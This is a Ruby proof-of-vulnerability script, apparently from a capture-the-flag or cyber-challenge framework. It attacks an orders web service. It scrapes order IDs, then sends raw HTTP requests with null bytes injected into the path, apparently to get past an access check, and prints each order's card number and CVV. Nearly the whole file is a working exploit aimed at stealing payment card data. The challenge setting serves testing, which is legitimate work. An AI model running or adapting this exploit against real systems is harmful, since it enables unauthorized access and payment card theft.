#!/usr/bin/env ruby

require "forwardable"
require "logger"
require "http"
require 'nokogiri'
require "socket"
require "timeout"

# range of lengths to pick in the absence of a `LENGTH` environment variable
LENGTH_RANGE=(100..200)

# seconds to wait for a given activity
DEFAULT_TIME_LIMIT = 5

LLL = Logger.new(STDERR,
                 formatter: proc do |sev, datetime, progname, msg|
                   "#{sev}: #{msg}\n"
                 end,
                 level: Logger::INFO)

# for a less-noisy poller experience, set the `LOGGER_MIN_LEVEL` environment
# variable to `WARN`, `ERROR`, or `FATAL`
if ENV['LOGGER_MIN_LEVEL']
  LLL.level = Logger.const_get(ENV['LOGGER_MIN_LEVEL'])
end

# allows fanning socket writes to a dump file for seeding a fuzzer
class Interceptor
  attr_accessor :sock, :dumper
  extend Forwardable

  def_delegators :@sock, :read, :getc

  def write(*args)
    dumper.write *args
    sock.write *args
  end
end

# the pov
class Pov
  attr_reader :host, :port

  def initialize
    @host = ENV['HOST'] || 'challenge'
    @port = (ENV['PORT'] || 3020).to_i

    pick_timeout!
  end

  def run!
    index_body = nil
    Timeout.timeout(@timeout) do
      index_body = HTTP.get("http://#{@host}:#{@port}/orders/").body
    end
    index = Nokogiri::HTML(index_body.to_s)

    ids = index.css('tbody tr').map{ |tr| tr.css('td').first.text }
    LLL.info "got ids:\n  #{ids.join("\n  ")}"

    ids.each do |id|
      LLL.info "trying order #{id}"
      Timeout.timeout(@timeout) do
        sock = TCPSocket.new @host, @port
        sock.write("GET /orders/#{id}\0=\"\0\"?11111 HTTP/1.1\r\n" +
                   "Host: localhost:32768\r\n" +
                   "User-Agent: curl/7.64.1\r\n" +
                   "Accept: */*\r\n\r\n")
        status = sock.gets
        unless status =~ /200 OK/
          LLL.info status
          LLL.info "didn't get 200 ok"
          exit(-1)
        end
        sock.gets
        len = sock.gets.strip.sub("Content-Length: ", '').to_i
        sock.gets
        got = sock.read(len).gsub("\0", '')
        doc = Nokogiri::HTML(got)
        LLL.debug got
        pan = doc.css('#pan').first.text
        puts "PRIVDATA=#{pan}"
        cvv = doc.css('#cvv').first.text
        puts "PRIVDATA=#{cvv}"
      end
    end

  end

  private

  # pick a timeout (seconds to wait per activity) from either `TIMEOUT`
  # environment variable or the `DEFAULT_TIME_LIMIT` constant
  def pick_timeout!
    @timeout = (ENV['TIMEOUT'] || DEFAULT_TIME_LIMIT).to_i
    $stdout.puts "TIMEOUT=#{@timeout}"
    $stdout.flush
  end
end

pov = Pov.new
at_exit do
  LLL.info((["ruby", $0] + ARGV).join(' '))
end
pov.run!

LLL.info "success :)"
